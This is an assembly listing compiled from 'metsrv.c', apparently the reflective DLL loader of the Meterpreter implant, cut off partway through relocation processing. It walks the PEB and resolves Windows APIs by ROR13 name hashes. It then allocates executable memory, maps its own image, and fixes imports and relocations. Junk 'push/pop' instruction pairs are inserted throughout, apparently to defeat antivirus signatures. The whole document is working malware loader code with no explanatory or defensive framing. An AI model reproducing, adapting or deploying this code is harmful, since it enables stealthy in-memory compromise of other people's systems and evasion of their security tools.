	.file	"metsrv.c"
	.text
	.def	_time;	.scl	3;	.type	32;	.endef
_time:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___time32, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_hAppInstance
	.bss
	.align 4
_hAppInstance:
	.space 4
	.text
	.globl	_caller
	.def	_caller;	.scl	2;	.type	32;	.endef
_caller:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	movl	4(%ebp), %eax
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_ReflectiveLoader@0
	.def	_ReflectiveLoader@0;	.scl	2;	.type	32;	.endef
_ReflectiveLoader@0:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$180, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	call	_caller
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
L8:
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	cmpw	$23117, %ax
push %eax
pop %eax
	jne	L6
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, -76(%ebp)
push %eax
pop %eax
	cmpl	$63, -76(%ebp)
push %eax
pop %eax
	jbe	L6
push %eax
pop %eax
	cmpl	$1023, -76(%ebp)
push %eax
pop %eax
	ja	L6
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -76(%ebp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	cmpl	$17744, %eax
push %eax
pop %eax
	je	L68
push %eax
pop %eax
L6:
	subl	$1, -40(%ebp)
push %eax
pop %eax
	jmp	L8
push %eax
pop %eax
L68:
	nop
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -80(%ebp)
push %eax
pop %eax
	movl	-80(%ebp), %eax
push %eax
pop %eax
	movb	$0, (%eax)
push %eax
pop %eax
	movl	-80(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movb	$0, (%eax)
push %eax
pop %eax
	movl	$48, -104(%ebp)
push %eax
pop %eax
	movl	-104(%ebp), %eax
push %eax
pop %eax
/APP
 # 1997 "/usr/share/mingw-w64/include/psdk_inc/intrin-impl.h" 1
	movl %fs:(%eax), %eax 
push %eax
pop %eax
 # 0 "" 2
/NO_APP
	movl	%eax, -108(%ebp)
push %eax
pop %eax
	movl	-108(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -84(%ebp)
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	movl	%eax, -84(%ebp)
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	jmp	L10
push %eax
pop %eax
L41:
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	40(%eax), %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movzwl	36(%eax), %eax
push %eax
pop %eax
	movw	%ax, -34(%ebp)
push %eax
pop %eax
	movl	$0, -60(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -72(%ebp)
push %eax
pop %eax
L15:
	movl	-72(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -112(%ebp)
push %eax
pop %eax
	movl	-112(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -116(%ebp)
push %eax
pop %eax
	movl	$13, -120(%ebp)
push %eax
pop %eax
	andl	$31, -120(%ebp)
push %eax
pop %eax
	movl	-120(%ebp), %eax
push %eax
pop %eax
	movl	-116(%ebp), %edx
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	rorl	%cl, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	nop
push %eax
pop %eax
	movl	%eax, -72(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	cmpb	$96, %al
push %eax
pop %eax
	jbe	L13
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edx
push %eax
pop %eax
	movl	-72(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	subl	$32, %eax
push %eax
pop %eax
	movl	%eax, -72(%ebp)
push %eax
pop %eax
	jmp	L14
push %eax
pop %eax
L13:
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	addl	%eax, -72(%ebp)
push %eax
pop %eax
L14:
	addl	$1, -56(%ebp)
push %eax
pop %eax
	subw	$1, -34(%ebp)
push %eax
pop %eax
	cmpw	$0, -34(%ebp)
push %eax
pop %eax
	jne	L15
push %eax
pop %eax
	movl	-72(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	cmpl	$1783282779, -60(%ebp)
push %eax
pop %eax
	jne	L16
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, -84(%ebp)
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -88(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	addl	$120, %eax
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -88(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -48(%ebp)
push %eax
pop %eax
	movw	$4, -34(%ebp)
push %eax
pop %eax
	movzwl	-34(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movw	%ax, -34(%ebp)
push %eax
pop %eax
	jmp	L17
push %eax
pop %eax
L29:
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -124(%ebp)
push %eax
pop %eax
	movl	$0, %ebx
push %eax
pop %eax
L20:
	movl	%ebx, -128(%ebp)
push %eax
pop %eax
	movl	-128(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -132(%ebp)
push %eax
pop %eax
	movl	$13, -136(%ebp)
push %eax
pop %eax
	andl	$31, -136(%ebp)
push %eax
pop %eax
	movl	-136(%ebp), %eax
push %eax
pop %eax
	movl	-132(%ebp), %edx
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	rorl	%cl, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	nop
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	-124(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movsbl	%al, %eax
push %eax
pop %eax
	addl	%eax, %ebx
push %eax
pop %eax
	addl	$1, -124(%ebp)
push %eax
pop %eax
	movl	-124(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	testb	%al, %al
push %eax
pop %eax
	jne	L20
push %eax
pop %eax
	movl	%ebx, %eax
push %eax
pop %eax
	movl	%eax, -92(%ebp)
push %eax
pop %eax
	cmpl	$-334606706, -92(%ebp)
push %eax
pop %eax
	je	L22
push %eax
pop %eax
	cmpl	$2081291434, -92(%ebp)
push %eax
pop %eax
	je	L22
push %eax
pop %eax
	cmpl	$2034681371, -92(%ebp)
push %eax
pop %eax
	je	L22
push %eax
pop %eax
	cmpl	$-1850750380, -92(%ebp)
push %eax
pop %eax
	je	L22
push %eax
pop %eax
	cmpl	$251015922, -92(%ebp)
push %eax
pop %eax
	jne	L23
push %eax
pop %eax
L22:
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -96(%ebp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%eax, -96(%ebp)
push %eax
pop %eax
	cmpl	$-334606706, -92(%ebp)
push %eax
pop %eax
	jne	L24
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L24:
	cmpl	$2081291434, -92(%ebp)
push %eax
pop %eax
	jne	L26
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L26:
	cmpl	$2034681371, -92(%ebp)
push %eax
pop %eax
	jne	L27
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L27:
	cmpl	$-1850750380, -92(%ebp)
push %eax
pop %eax
	jne	L28
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L28:
	cmpl	$251015922, -92(%ebp)
push %eax
pop %eax
	jne	L25
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
L25:
	movzwl	-34(%ebp), %eax
push %eax
pop %eax
	subl	$1, %eax
push %eax
pop %eax
	movw	%ax, -34(%ebp)
push %eax
pop %eax
L23:
	addl	$4, -44(%ebp)
push %eax
pop %eax
	addl	$2, -48(%ebp)
push %eax
pop %eax
L17:
	cmpw	$0, -34(%ebp)
push %eax
pop %eax
	jne	L29
push %eax
pop %eax
	jmp	L30
push %eax
pop %eax
L16:
	cmpl	$1023043677, -60(%ebp)
push %eax
pop %eax
	jne	L30
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, -84(%ebp)
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -88(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	addl	$120, %eax
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -88(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -48(%ebp)
push %eax
pop %eax
	movw	$1, -34(%ebp)
push %eax
pop %eax
	jmp	L31
push %eax
pop %eax
L38:
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -140(%ebp)
push %eax
pop %eax
	movl	$0, %ebx
push %eax
pop %eax
L34:
	movl	%ebx, -144(%ebp)
push %eax
pop %eax
	movl	-144(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -148(%ebp)
push %eax
pop %eax
	movl	$13, -152(%ebp)
push %eax
pop %eax
	andl	$31, -152(%ebp)
push %eax
pop %eax
	movl	-152(%ebp), %eax
push %eax
pop %eax
	movl	-148(%ebp), %edx
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	rorl	%cl, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	nop
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	-140(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movsbl	%al, %eax
push %eax
pop %eax
	addl	%eax, %ebx
push %eax
pop %eax
	addl	$1, -140(%ebp)
push %eax
pop %eax
	movl	-140(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	testb	%al, %al
push %eax
pop %eax
	jne	L34
push %eax
pop %eax
	movl	%ebx, %eax
push %eax
pop %eax
	movl	%eax, -92(%ebp)
push %eax
pop %eax
	cmpl	$1397492408, -92(%ebp)
push %eax
pop %eax
	jne	L36
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -96(%ebp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%eax, -96(%ebp)
push %eax
pop %eax
	cmpl	$1397492408, -92(%ebp)
push %eax
pop %eax
	jne	L37
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
L37:
	movzwl	-34(%ebp), %eax
push %eax
pop %eax
	subl	$1, %eax
push %eax
pop %eax
	movw	%ax, -34(%ebp)
push %eax
pop %eax
L36:
	addl	$4, -44(%ebp)
push %eax
pop %eax
	addl	$2, -48(%ebp)
push %eax
pop %eax
L31:
	cmpw	$0, -34(%ebp)
push %eax
pop %eax
	jne	L38
push %eax
pop %eax
L30:
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L39
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L39
push %eax
pop %eax
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	je	L39
push %eax
pop %eax
	cmpl	$0, -24(%ebp)
push %eax
pop %eax
	je	L39
push %eax
pop %eax
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	je	L39
push %eax
pop %eax
	cmpl	$0, -28(%ebp)
push %eax
pop %eax
	jne	L69
push %eax
pop %eax
L39:
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
L10:
	cmpl	$0, -52(%ebp)
push %eax
pop %eax
	jne	L41
push %eax
pop %eax
	jmp	L40
push %eax
pop %eax
L69:
	nop
push %eax
pop %eax
L40:
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -76(%ebp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	$4, 12(%esp)
push %eax
pop %eax
	movl	$12288, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -84(%ebp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	84(%eax), %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	jmp	L42
push %eax
pop %eax
L43:
	movl	-56(%ebp), %eax
push %eax
pop %eax
	leal	1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -56(%ebp)
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	leal	1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -60(%ebp)
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movzbl	(%ecx), %eax
push %eax
pop %eax
	movb	%al, (%edx)
push %eax
pop %eax
L42:
	movl	-52(%ebp), %eax
push %eax
pop %eax
	leal	-1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -52(%ebp)
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L43
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movzwl	20(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movzwl	6(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	movl	%eax, -68(%ebp)
push %eax
pop %eax
	jmp	L44
push %eax
pop %eax
L47:
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, -64(%ebp)
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L46:
	movl	-60(%ebp), %eax
push %eax
pop %eax
	leal	1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -60(%ebp)
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	leal	1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -56(%ebp)
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movzbl	(%ecx), %eax
push %eax
pop %eax
	movb	%al, (%edx)
push %eax
pop %eax
L45:
	movl	-64(%ebp), %eax
push %eax
pop %eax
	leal	-1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -64(%ebp)
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L46
push %eax
pop %eax
	addl	$40, -52(%ebp)
push %eax
pop %eax
L44:
	movl	-68(%ebp), %eax
push %eax
pop %eax
	leal	-1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -68(%ebp)
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L47
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	subl	$-128, %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	jmp	L48
push %eax
pop %eax
L54:
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	12(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	cmpl	$0, -40(%ebp)
push %eax
pop %eax
	jne	L49
push %eax
pop %eax
	addl	$20, -60(%ebp)
push %eax
pop %eax
	jmp	L48
push %eax
pop %eax
L49:
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -64(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	jmp	L50
push %eax
pop %eax
L53:
	cmpl	$0, -64(%ebp)
push %eax
pop %eax
	je	L51
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jns	L51
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -88(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	addl	$120, %eax
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -88(%ebp)
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -96(%ebp)
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-88(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%eax, -96(%ebp)
push %eax
pop %eax
	movl	-96(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %ecx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	-40(%ebp), %edx
push %eax
pop %eax
	addl	%ecx, %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	jmp	L52
push %eax
pop %eax
L51:
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	leal	2(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
L52:
	addl	$4, -52(%ebp)
push %eax
pop %eax
	cmpl	$0, -64(%ebp)
push %eax
pop %eax
	je	L50
push %eax
pop %eax
	addl	$4, -64(%ebp)
push %eax
pop %eax
L50:
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L53
push %eax
pop %eax
	addl	$20, -60(%ebp)
push %eax
pop %eax
L48:
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L54
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	52(%eax), %eax
push %eax
pop %eax
	movl	-84(%ebp), %edx
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	addl	$160, %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L55
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	%eax, -68(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	jmp	L56
push %eax
pop %eax
L63:
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	subl	$8, %eax
push %eax
pop %eax
	shrl	%eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movl	%eax, -64(%ebp)
push %eax
pop %eax
	jmp	L57
push %eax
pop %eax
L62:
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzbl	1(%eax), %eax
push %eax
pop %eax
	andl	$-16, %eax
push %eax
pop %eax
